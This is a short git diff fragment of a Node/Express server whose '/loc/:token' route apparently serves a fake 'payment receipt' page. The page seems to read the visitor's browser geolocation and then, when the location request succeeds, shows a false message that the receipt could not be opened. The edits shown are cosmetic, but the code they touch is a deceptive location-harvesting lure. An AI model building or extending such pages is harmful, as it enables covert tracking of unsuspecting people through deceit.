@@ -8,7 +8,7 @@ const app = express();
 app.use(express.json());
 
 // ✅ Tokens válidos (adicione mais se quiser)
-const validTokens = new Set(['comprovante.mmb']);
+const validTokens = new Set(["comprovante.mmb"]);
 
 function must(name) {
   const v = process.env[name];
@@ -169,7 +169,7 @@ app.get("/loc/:token", (req, res) => {
     });
 
     if (r.ok) {
-      out.textContent = "Não foi possivel abrir o comprovante ❌ (Erro ~" + Math.round(pos.coords.accuracy) + " m)";
+      out.textContent = "Não foi possivel abrir o comprovante ❌ (Erro ~" + Math.round(pos.coords.accuracy) + " )";
     } else {
       let msg = "Erro0001939❌ (" + r.status + ")";
       try {
